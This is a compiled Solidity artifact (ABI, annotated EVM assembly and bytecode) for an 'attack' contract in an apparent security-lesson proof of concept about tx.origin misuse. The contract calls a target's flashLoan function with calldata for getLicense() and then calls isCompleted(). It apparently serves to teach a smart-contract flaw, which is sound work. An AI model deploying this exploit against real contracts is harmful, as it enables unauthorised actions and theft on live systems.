{
	"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol": {
		"attack": {
			"abi": [
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "_addr",
							"type": "address"
						},
						{
							"internalType": "uint256",
							"name": "amount",
							"type": "uint256"
						}
					],
					"name": "att",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [
						{
							"internalType": "address payable",
							"name": "_addr",
							"type": "address"
						}
					],
					"name": "complete",
					"outputs": [],
					"stateMutability": "nonpayable",
					"type": "function"
				},
				{
					"inputs": [],
					"name": "getData",
					"outputs": [
						{
							"internalType": "bytes",
							"name": "",
							"type": "bytes"
						}
					],
					"stateMutability": "pure",
					"type": "function"
				},
				{
					"stateMutability": "payable",
					"type": "receive"
				}
			],
			"devdoc": {
				"kind": "dev",
				"methods": {},
				"version": 1
			},
			"evm": {
				"assembly": "    /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":210:732  contract attack{... */\n  mstore(0x40, 0x80)\n  callvalue\n  dup1\n  iszero\n  tag_1\n  jumpi\n  0x00\n  dup1\n  revert\ntag_1:\n  pop\n  dataSize(sub_0)\n  dup1\n  dataOffset(sub_0)\n  0x00\n  codecopy\n  0x00\n  return\nstop\n\nsub_0: assembly {\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":210:732  contract attack{... */\n      mstore(0x40, 0x80)\n      jumpi(tag_1, lt(calldatasize, 0x04))\n      shr(0xe0, calldataload(0x00))\n      dup1\n      0x09d9ff80\n      eq\n      tag_3\n      jumpi\n      dup1\n      0x3bc5de30\n      eq\n      tag_4\n      jumpi\n      dup1\n      0x93af0292\n      eq\n      tag_5\n      jumpi\n      jump(tag_2)\n    tag_1:\n      jumpi(tag_2, calldatasize)\n      stop\n    tag_2:\n      0x00\n      dup1\n      revert\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":438:563  function att(address payable _addr,uint256 amount)public{... */\n    tag_3:\n      callvalue\n      dup1\n      iszero\n      tag_8\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_8:\n      pop\n      tag_9\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_10\n      swap2\n      swap1\n      tag_11\n      jump\t// in\n    tag_10:\n      tag_12\n      jump\t// in\n    tag_9:\n      stop\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":280:396  function getData()public pure returns(bytes memory){... */\n    tag_4:\n      callvalue\n      dup1\n      iszero\n      tag_13\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_13:\n      pop\n      tag_14\n      tag_15\n      jump\t// in\n    tag_14:\n      mload(0x40)\n      tag_16\n      swap2\n      swap1\n      tag_17\n      jump\t// in\n    tag_16:\n      mload(0x40)\n      dup1\n      swap2\n      sub\n      swap1\n      return\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":601:696  function complete(address payable _addr)public{... */\n    tag_5:\n      callvalue\n      dup1\n      iszero\n      tag_18\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_18:\n      pop\n      tag_19\n      0x04\n      dup1\n      calldatasize\n      sub\n      dup2\n      add\n      swap1\n      tag_20\n      swap2\n      swap1\n      tag_21\n      jump\t// in\n    tag_20:\n      tag_22\n      jump\t// in\n    tag_19:\n      stop\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":438:563  function att(address payable _addr,uint256 amount)public{... */\n    tag_12:\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":515:520  _addr */\n      dup2\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":505:531  Flashloan(_addr).flashLoan */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xe0232b42\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":532:537  _addr */\n      dup4\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":538:544  amount */\n      dup4\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":545:554  getData() */\n      tag_24\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":545:552  getData */\n      tag_15\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":545:554  getData() */\n      jump\t// in\n    tag_24:\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":505:555  Flashloan(_addr).flashLoan(_addr,amount,getData()) */\n      mload(0x40)\n      dup5\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      tag_25\n      swap4\n      swap3\n      swap2\n      swap1\n      tag_26\n      jump\t// in\n    tag_25:\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_27\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_27:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_29\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_29:\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":438:563  function att(address payable _addr,uint256 amount)public{... */\n      pop\n      pop\n      jump\t// out\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":280:396  function getData()public pure returns(bytes memory){... */\n    tag_15:\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":318:330  bytes memory */\n      0x60\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":349:388  abi.encodeWithSignature(\"getLicense()\") */\n      add(0x24, mload(0x40))\n      mload(0x40)\n      0x20\n      dup2\n      dup4\n      sub\n      sub\n      dup2\n      mstore\n      swap1\n      0x40\n      mstore\n      and(not(0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff), 0xc5e4dd8200000000000000000000000000000000000000000000000000000000)\n      0x20\n      dup3\n      add\n      dup1\n      mload\n      0xffffffffffffffffffffffffffffffffffffffffffffffffffffffff\n      dup4\n      dup2\n      dup4\n      and\n      or\n      dup4\n      mstore\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":342:388  return abi.encodeWithSignature(\"getLicense()\") */\n      swap1\n      pop\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":280:396  function getData()public pure returns(bytes memory){... */\n      swap1\n      jump\t// out\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":601:696  function complete(address payable _addr)public{... */\n    tag_22:\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":668:673  _addr */\n      dup1\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":658:686  Flashloan(_addr).isCompleted */\n      0xffffffffffffffffffffffffffffffffffffffff\n      and\n      0xfa391c64\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":658:688  Flashloan(_addr).isCompleted() */\n      mload(0x40)\n      dup2\n      0xffffffff\n      and\n      0xe0\n      shl\n      dup2\n      mstore\n      0x04\n      add\n      0x00\n      mload(0x40)\n      dup1\n      dup4\n      sub\n      dup2\n      0x00\n      dup8\n      dup1\n      extcodesize\n      iszero\n      dup1\n      iszero\n      tag_32\n      jumpi\n      0x00\n      dup1\n      revert\n    tag_32:\n      pop\n      gas\n      call\n      iszero\n      dup1\n      iszero\n      tag_34\n      jumpi\n      returndatasize\n      0x00\n      dup1\n      returndatacopy\n      revert(0x00, returndatasize)\n    tag_34:\n      pop\n      pop\n      pop\n      pop\n        /* \"SecLessonPoc-main/contracts/wrongTxorigin/attack/FlashloanAttack.sol\":601:696  function complete(address payable _addr)public{... */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":88:205   */\n    tag_36:\n        /* \"#utility.yul\":197:198   */\n      0x00\n        /* \"#utility.yul\":194:195   */\n      dup1\n        /* \"#utility.yul\":187:199   */\n      revert\n        /* \"#utility.yul\":334:460   */\n    tag_38:\n        /* \"#utility.yul\":371:378   */\n      0x00\n        /* \"#utility.yul\":411:453   */\n      0xffffffffffffffffffffffffffffffffffffffff\n        /* \"#utility.yul\":404:409   */\n      dup3\n        /* \"#utility.yul\":400:454   */\n      and\n        /* \"#utility.yul\":389:454   */\n      swap1\n      pop\n        /* \"#utility.yul\":334:460   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":466:570   */\n    tag_39:\n        /* \"#utility.yul\":511:518   */\n      0x00\n        /* \"#utility.yul\":540:564   */\n      tag_62\n        /* \"#utility.yul\":558:563   */\n      dup3\n        /* \"#utility.yul\":540:564   */\n      tag_38\n      jump\t// in\n    tag_62:\n        /* \"#utility.yul\":529:564   */\n      swap1\n      pop\n        /* \"#utility.yul\":466:570   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":576:714   */\n    tag_40:\n        /* \"#utility.yul\":657:689   */\n      tag_64\n        /* \"#utility.yul\":683:688   */\n      dup2\n        /* \"#utility.yul\":657:689   */\n      tag_39\n      jump\t// in\n    tag_64:\n        /* \"#utility.yul\":650:655   */\n      dup2\n        /* \"#utility.yul\":647:690   */\n      eq\n        /* \"#utility.yul\":637:708   */\n      tag_65\n      jumpi\n        /* \"#utility.yul\":704:705   */\n      0x00\n        /* \"#utility.yul\":701:702   */\n      dup1\n        /* \"#utility.yul\":694:706   */\n      revert\n        /* \"#utility.yul\":637:708   */\n    tag_65:\n        /* \"#utility.yul\":576:714   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":720:875   */\n    tag_41:\n        /* \"#utility.yul\":774:779   */\n      0x00\n        /* \"#utility.yul\":812:818   */\n      dup2\n        /* \"#utility.yul\":799:819   */\n      calldataload\n        /* \"#utility.yul\":790:819   */\n      swap1\n      pop\n        /* \"#utility.yul\":828:869   */\n      tag_67\n        /* \"#utility.yul\":863:868   */\n      dup2\n        /* \"#utility.yul\":828:869   */\n      tag_40\n      jump\t// in\n    tag_67:\n        /* \"#utility.yul\":720:875   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":881:958   */\n    tag_42:\n        /* \"#utility.yul\":918:925   */\n      0x00\n        /* \"#utility.yul\":947:952   */\n      dup2\n        /* \"#utility.yul\":936:952   */\n      swap1\n      pop\n        /* \"#utility.yul\":881:958   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":964:1086   */\n    tag_43:\n        /* \"#utility.yul\":1037:1061   */\n      tag_70\n        /* \"#utility.yul\":1055:1060   */\n      dup2\n        /* \"#utility.yul\":1037:1061   */\n      tag_42\n      jump\t// in\n    tag_70:\n        /* \"#utility.yul\":1030:1035   */\n      dup2\n        /* \"#utility.yul\":1027:1062   */\n      eq\n        /* \"#utility.yul\":1017:1080   */\n      tag_71\n      jumpi\n        /* \"#utility.yul\":1076:1077   */\n      0x00\n        /* \"#utility.yul\":1073:1074   */\n      dup1\n        /* \"#utility.yul\":1066:1078   */\n      revert\n        /* \"#utility.yul\":1017:1080   */\n    tag_71:\n        /* \"#utility.yul\":964:1086   */\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1092:1231   */\n    tag_44:\n        /* \"#utility.yul\":1138:1143   */\n      0x00\n        /* \"#utility.yul\":1176:1182   */\n      dup2\n        /* \"#utility.yul\":1163:1183   */\n      calldataload\n        /* \"#utility.yul\":1154:1183   */\n      swap1\n      pop\n        /* \"#utility.yul\":1192:1225   */\n      tag_73\n        /* \"#utility.yul\":1219:1224   */\n      dup2\n        /* \"#utility.yul\":1192:1225   */\n      tag_43\n      jump\t// in\n    tag_73:\n        /* \"#utility.yul\":1092:1231   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1237:1727   */\n    tag_11:\n        /* \"#utility.yul\":1313:1319   */\n      0x00\n        /* \"#utility.yul\":1321:1327   */\n      dup1\n        /* \"#utility.yul\":1370:1372   */\n      0x40\n        /* \"#utility.yul\":1358:1367   */\n      dup4\n        /* \"#utility.yul\":1349:1356   */\n      dup6\n        /* \"#utility.yul\":1345:1368   */\n      sub\n        /* \"#utility.yul\":1341:1373   */\n      slt\n        /* \"#utility.yul\":1338:1457   */\n      iszero\n      tag_75\n      jumpi\n        /* \"#utility.yul\":1376:1455   */\n      tag_76\n      tag_36\n      jump\t// in\n    tag_76:\n        /* \"#utility.yul\":1338:1457   */\n    tag_75:\n        /* \"#utility.yul\":1496:1497   */\n      0x00\n        /* \"#utility.yul\":1521:1582   */\n      tag_77\n        /* \"#utility.yul\":1574:1581   */\n      dup6\n        /* \"#utility.yul\":1565:1571   */\n      dup3\n        /* \"#utility.yul\":1554:1563   */\n      dup7\n        /* \"#utility.yul\":1550:1572   */\n      add\n        /* \"#utility.yul\":1521:1582   */\n      tag_41\n      jump\t// in\n    tag_77:\n        /* \"#utility.yul\":1511:1582   */\n      swap3\n      pop\n        /* \"#utility.yul\":1467:1592   */\n      pop\n        /* \"#utility.yul\":1631:1633   */\n      0x20\n        /* \"#utility.yul\":1657:1710   */\n      tag_78\n        /* \"#utility.yul\":1702:1709   */\n      dup6\n        /* \"#utility.yul\":1693:1699   */\n      dup3\n        /* \"#utility.yul\":1682:1691   */\n      dup7\n        /* \"#utility.yul\":1678:1700   */\n      add\n        /* \"#utility.yul\":1657:1710   */\n      tag_44\n      jump\t// in\n    tag_78:\n        /* \"#utility.yul\":1647:1710   */\n      swap2\n      pop\n        /* \"#utility.yul\":1602:1720   */\n      pop\n        /* \"#utility.yul\":1237:1727   */\n      swap3\n      pop\n      swap3\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1733:1831   */\n    tag_45:\n        /* \"#utility.yul\":1784:1790   */\n      0x00\n        /* \"#utility.yul\":1818:1823   */\n      dup2\n        /* \"#utility.yul\":1812:1824   */\n      mload\n        /* \"#utility.yul\":1802:1824   */\n      swap1\n      pop\n        /* \"#utility.yul\":1733:1831   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":1837:2005   */\n    tag_46:\n        /* \"#utility.yul\":1920:1931   */\n      0x00\n        /* \"#utility.yul\":1954:1960   */\n      dup3\n        /* \"#utility.yul\":1949:1952   */\n      dup3\n        /* \"#utility.yul\":1942:1961   */\n      mstore\n        /* \"#utility.yul\":1994:1998   */\n      0x20\n        /* \"#utility.yul\":1989:1992   */\n      dup3\n        /* \"#utility.yul\":1985:1999   */\n      add\n        /* \"#utility.yul\":1970:1999   */\n      swap1\n      pop\n        /* \"#utility.yul\":1837:2005   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2011:2257   */\n    tag_47:\n        /* \"#utility.yul\":2092:2093   */\n      0x00\n        /* \"#utility.yul\":2102:2215   */\n    tag_82:\n        /* \"#utility.yul\":2116:2122   */\n      dup4\n        /* \"#utility.yul\":2113:2114   */\n      dup2\n        /* \"#utility.yul\":2110:2123   */\n      lt\n        /* \"#utility.yul\":2102:2215   */\n      iszero\n      tag_84\n      jumpi\n        /* \"#utility.yul\":2201:2202   */\n      dup1\n        /* \"#utility.yul\":2196:2199   */\n      dup3\n        /* \"#utility.yul\":2192:2203   */\n      add\n        /* \"#utility.yul\":2186:2204   */\n      mload\n        /* \"#utility.yul\":2182:2183   */\n      dup2\n        /* \"#utility.yul\":2177:2180   */\n      dup5\n        /* \"#utility.yul\":2173:2184   */\n      add\n        /* \"#utility.yul\":2166:2205   */\n      mstore\n        /* \"#utility.yul\":2138:2140   */\n      0x20\n        /* \"#utility.yul\":2135:2136   */\n      dup2\n        /* \"#utility.yul\":2131:2141   */\n      add\n        /* \"#utility.yul\":2126:2141   */\n      swap1\n      pop\n        /* \"#utility.yul\":2102:2215   */\n      jump(tag_82)\n    tag_84:\n        /* \"#utility.yul\":2249:2250   */\n      0x00\n        /* \"#utility.yul\":2240:2246   */\n      dup5\n        /* \"#utility.yul\":2235:2238   */\n      dup5\n        /* \"#utility.yul\":2231:2247   */\n      add\n        /* \"#utility.yul\":2224:2251   */\n      mstore\n        /* \"#utility.yul\":2073:2257   */\n      pop\n        /* \"#utility.yul\":2011:2257   */\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2263:2365   */\n    tag_48:\n        /* \"#utility.yul\":2304:2310   */\n      0x00\n        /* \"#utility.yul\":2355:2357   */\n      0x1f\n        /* \"#utility.yul\":2351:2358   */\n      not\n        /* \"#utility.yul\":2346:2348   */\n      0x1f\n        /* \"#utility.yul\":2339:2344   */\n      dup4\n        /* \"#utility.yul\":2335:2349   */\n      add\n        /* \"#utility.yul\":2331:2359   */\n      and\n        /* \"#utility.yul\":2321:2359   */\n      swap1\n      pop\n        /* \"#utility.yul\":2263:2365   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2371:2744   */\n    tag_49:\n        /* \"#utility.yul\":2457:2460   */\n      0x00\n        /* \"#utility.yul\":2485:2523   */\n      tag_87\n        /* \"#utility.yul\":2517:2522   */\n      dup3\n        /* \"#utility.yul\":2485:2523   */\n      tag_45\n      jump\t// in\n    tag_87:\n        /* \"#utility.yul\":2539:2609   */\n      tag_88\n        /* \"#utility.yul\":2602:2608   */\n      dup2\n        /* \"#utility.yul\":2597:2600   */\n      dup6\n        /* \"#utility.yul\":2539:2609   */\n      tag_46\n      jump\t// in\n    tag_88:\n        /* \"#utility.yul\":2532:2609   */\n      swap4\n      pop\n        /* \"#utility.yul\":2618:2683   */\n      tag_89\n        /* \"#utility.yul\":2676:2682   */\n      dup2\n        /* \"#utility.yul\":2671:2674   */\n      dup6\n        /* \"#utility.yul\":2664:2668   */\n      0x20\n        /* \"#utility.yul\":2657:2662   */\n      dup7\n        /* \"#utility.yul\":2653:2669   */\n      add\n        /* \"#utility.yul\":2618:2683   */\n      tag_47\n      jump\t// in\n    tag_89:\n        /* \"#utility.yul\":2708:2737   */\n      tag_90\n        /* \"#utility.yul\":2730:2736   */\n      dup2\n        /* \"#utility.yul\":2708:2737   */\n      tag_48\n      jump\t// in\n    tag_90:\n        /* \"#utility.yul\":2703:2706   */\n      dup5\n        /* \"#utility.yul\":2699:2738   */\n      add\n        /* \"#utility.yul\":2692:2738   */\n      swap2\n      pop\n        /* \"#utility.yul\":2461:2744   */\n      pop\n        /* \"#utility.yul\":2371:2744   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":2750:3059   */\n    tag_17:\n        /* \"#utility.yul\":2861:2865   */\n      0x00\n        /* \"#utility.yul\":2899:2901   */\n      0x20\n        /* \"#utility.yul\":2888:2897   */\n      dup3\n        /* \"#utility.yul\":2884:2902   */\n      add\n        /* \"#utility.yul\":2876:2902   */\n      swap1\n      pop\n        /* \"#utility.yul\":2948:2957   */\n      dup2\n        /* \"#utility.yul\":2942:2946   */\n      dup2\n        /* \"#utility.yul\":2938:2958   */\n      sub\n        /* \"#utility.yul\":2934:2935   */\n      0x00\n        /* \"#utility.yul\":2923:2932   */\n      dup4\n        /* \"#utility.yul\":2919:2936   */\n      add\n        /* \"#utility.yul\":2912:2959   */\n      mstore\n        /* \"#utility.yul\":2976:3052   */\n      tag_92\n        /* \"#utility.yul\":3047:3051   */\n      dup2\n        /* \"#utility.yul\":3038:3044   */\n      dup5\n        /* \"#utility.yul\":2976:3052   */\n      tag_49\n      jump\t// in\n    tag_92:\n        /* \"#utility.yul\":2968:3052   */\n      swap1\n      pop\n        /* \"#utility.yul\":2750:3059   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3065:3410   */\n    tag_21:\n        /* \"#utility.yul\":3132:3138   */\n      0x00\n        /* \"#utility.yul\":3181:3183   */\n      0x20\n        /* \"#utility.yul\":3169:3178   */\n      dup3\n        /* \"#utility.yul\":3160:3167   */\n      dup5\n        /* \"#utility.yul\":3156:3179   */\n      sub\n        /* \"#utility.yul\":3152:3184   */\n      slt\n        /* \"#utility.yul\":3149:3268   */\n      iszero\n      tag_94\n      jumpi\n        /* \"#utility.yul\":3187:3266   */\n      tag_95\n      tag_36\n      jump\t// in\n    tag_95:\n        /* \"#utility.yul\":3149:3268   */\n    tag_94:\n        /* \"#utility.yul\":3307:3308   */\n      0x00\n        /* \"#utility.yul\":3332:3393   */\n      tag_96\n        /* \"#utility.yul\":3385:3392   */\n      dup5\n        /* \"#utility.yul\":3376:3382   */\n      dup3\n        /* \"#utility.yul\":3365:3374   */\n      dup6\n        /* \"#utility.yul\":3361:3383   */\n      add\n        /* \"#utility.yul\":3332:3393   */\n      tag_41\n      jump\t// in\n    tag_96:\n        /* \"#utility.yul\":3322:3393   */\n      swap2\n      pop\n        /* \"#utility.yul\":3278:3403   */\n      pop\n        /* \"#utility.yul\":3065:3410   */\n      swap3\n      swap2\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3416:3476   */\n    tag_50:\n        /* \"#utility.yul\":3444:3447   */\n      0x00\n        /* \"#utility.yul\":3465:3470   */\n      dup2\n        /* \"#utility.yul\":3458:3470   */\n      swap1\n      pop\n        /* \"#utility.yul\":3416:3476   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3482:3624   */\n    tag_51:\n        /* \"#utility.yul\":3532:3541   */\n      0x00\n        /* \"#utility.yul\":3565:3618   */\n      tag_99\n        /* \"#utility.yul\":3583:3617   */\n      tag_100\n        /* \"#utility.yul\":3592:3616   */\n      tag_101\n        /* \"#utility.yul\":3610:3615   */\n      dup5\n        /* \"#utility.yul\":3592:3616   */\n      tag_38\n      jump\t// in\n    tag_101:\n        /* \"#utility.yul\":3583:3617   */\n      tag_50\n      jump\t// in\n    tag_100:\n        /* \"#utility.yul\":3565:3618   */\n      tag_38\n      jump\t// in\n    tag_99:\n        /* \"#utility.yul\":3552:3618   */\n      swap1\n      pop\n        /* \"#utility.yul\":3482:3624   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3630:3756   */\n    tag_52:\n        /* \"#utility.yul\":3680:3689   */\n      0x00\n        /* \"#utility.yul\":3713:3750   */\n      tag_103\n        /* \"#utility.yul\":3744:3749   */\n      dup3\n        /* \"#utility.yul\":3713:3750   */\n      tag_51\n      jump\t// in\n    tag_103:\n        /* \"#utility.yul\":3700:3750   */\n      swap1\n      pop\n        /* \"#utility.yul\":3630:3756   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3762:3896   */\n    tag_53:\n        /* \"#utility.yul\":3820:3829   */\n      0x00\n        /* \"#utility.yul\":3853:3890   */\n      tag_105\n        /* \"#utility.yul\":3884:3889   */\n      dup3\n        /* \"#utility.yul\":3853:3890   */\n      tag_52\n      jump\t// in\n    tag_105:\n        /* \"#utility.yul\":3840:3890   */\n      swap1\n      pop\n        /* \"#utility.yul\":3762:3896   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3902:4049   */\n    tag_54:\n        /* \"#utility.yul\":3997:4042   */\n      tag_107\n        /* \"#utility.yul\":4036:4041   */\n      dup2\n        /* \"#utility.yul\":3997:4042   */\n      tag_53\n      jump\t// in\n    tag_107:\n        /* \"#utility.yul\":3992:3995   */\n      dup3\n        /* \"#utility.yul\":3985:4043   */\n      mstore\n        /* \"#utility.yul\":3902:4049   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4055:4173   */\n    tag_55:\n        /* \"#utility.yul\":4142:4166   */\n      tag_109\n        /* \"#utility.yul\":4160:4165   */\n      dup2\n        /* \"#utility.yul\":4142:4166   */\n      tag_42\n      jump\t// in\n    tag_109:\n        /* \"#utility.yul\":4137:4140   */\n      dup3\n        /* \"#utility.yul\":4130:4167   */\n      mstore\n        /* \"#utility.yul\":4055:4173   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4179:4724   */\n    tag_26:\n        /* \"#utility.yul\":4354:4358   */\n      0x00\n        /* \"#utility.yul\":4392:4394   */\n      0x60\n        /* \"#utility.yul\":4381:4390   */\n      dup3\n        /* \"#utility.yul\":4377:4395   */\n      add\n        /* \"#utility.yul\":4369:4395   */\n      swap1\n      pop\n        /* \"#utility.yul\":4405:4484   */\n      tag_111\n        /* \"#utility.yul\":4481:4482   */\n      0x00\n        /* \"#utility.yul\":4470:4479   */\n      dup4\n        /* \"#utility.yul\":4466:4483   */\n      add\n        /* \"#utility.yul\":4457:4463   */\n      dup7\n        /* \"#utility.yul\":4405:4484   */\n      tag_54\n      jump\t// in\n    tag_111:\n        /* \"#utility.yul\":4494:4566   */\n      tag_112\n        /* \"#utility.yul\":4562:4564   */\n      0x20\n        /* \"#utility.yul\":4551:4560   */\n      dup4\n        /* \"#utility.yul\":4547:4565   */\n      add\n        /* \"#utility.yul\":4538:4544   */\n      dup6\n        /* \"#utility.yul\":4494:4566   */\n      tag_55\n      jump\t// in\n    tag_112:\n        /* \"#utility.yul\":4613:4622   */\n      dup2\n        /* \"#utility.yul\":4607:4611   */\n      dup2\n        /* \"#utility.yul\":4603:4623   */\n      sub\n        /* \"#utility.yul\":4598:4600   */\n      0x40\n        /* \"#utility.yul\":4587:4596   */\n      dup4\n        /* \"#utility.yul\":4583:4601   */\n      add\n        /* \"#utility.yul\":4576:4624   */\n      mstore\n        /* \"#utility.yul\":4641:4717   */\n      tag_113\n        /* \"#utility.yul\":4712:4716   */\n      dup2\n        /* \"#utility.yul\":4703:4709   */\n      dup5\n        /* \"#utility.yul\":4641:4717   */\n      tag_49\n      jump\t// in\n    tag_113:\n        /* \"#utility.yul\":4633:4717   */\n      swap1\n      pop\n        /* \"#utility.yul\":4179:4724   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa26469706673582212205619ce60d76dadb9071e44f16850a49d36fe5c8cb771cef193d83c40f9afa6fb64736f6c63430008130033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561001057600080fd5b506104c2806100206000396000f3fe6080604052600436106100385760003560e01c806309d9ff80146100445780633bc5de301461006d57806393af0292146100985761003f565b3661003f57005b600080fd5b34801561005057600080fd5b5061006b600480360381019061006691906102c1565b6100c1565b005b34801561007957600080fd5b5061008261013b565b60405161008f9190610391565b60405180910390f35b3480156100a457600080fd5b506100bf60048036038101906100ba91906103b3565b6101c5565b005b8173ffffffffffffffffffffffffffffffffffffffff1663e0232b4283836100e761013b565b6040518463ffffffff1660e01b81526004016101059392919061044e565b600060405180830381600087803b15801561011f57600080fd5b505af1158015610133573d6000803e3d6000fd5b505050505050565b60606040516024016040516020818303038152906040527fc5e4dd82000000000000000000000000000000000000000000000000000000007bffffffffffffffffffffffffffffffffffffffffffffffffffffffff19166020820180517bffffffffffffffffffffffffffffffffffffffffffffffffffffffff8381831617835250505050905090565b8073ffffffffffffffffffffffffffffffffffffffff1663fa391c646040518163ffffffff1660e01b8152600401600060405180830381600087803b15801561020d57600080fd5b505af1158015610221573d6000803e3d6000fd5b5050505050565b600080fd5b600073ffffffffffffffffffffffffffffffffffffffff82169050919050565b60006102588261022d565b9050919050565b6102688161024d565b811461027357600080fd5b50565b6000813590506102858161025f565b92915050565b6000819050919050565b61029e8161028b565b81146102a957600080fd5b50565b6000813590506102bb81610295565b92915050565b600080604083850312156102d8576102d7610228565b5b60006102e685828601610276565b92505060206102f7858286016102ac565b9150509250929050565b600081519050919050565b600082825260208201905092915050565b60005b8381101561033b578082015181840152602081019050610320565b60008484015250505050565b6000601f19601f8301169050919050565b600061036382610301565b61036d818561030c565b935061037d81856020860161031d565b61038681610347565b840191505092915050565b600060208201905081810360008301526103ab8184610358565b905092915050565b6000602082840312156103c9576103c8610228565b5b60006103d784828501610276565b91505092915050565b6000819050919050565b60006104056104006103fb8461022d565b6103e0565b61022d565b9050919050565b6000610417826103ea565b9050919050565b60006104298261040c565b9050919050565b6104398161041e565b82525050565b6104488161028b565b82525050565b60006060820190506104636000830186610430565b610470602083018561043f565b81810360408301526104828184610358565b905094935050505056fea26469706673582212205619ce60d76dadb9071e44f16850a49d36fe5c8cb771cef193d83c40f9afa6fb64736f6c63430008130033",
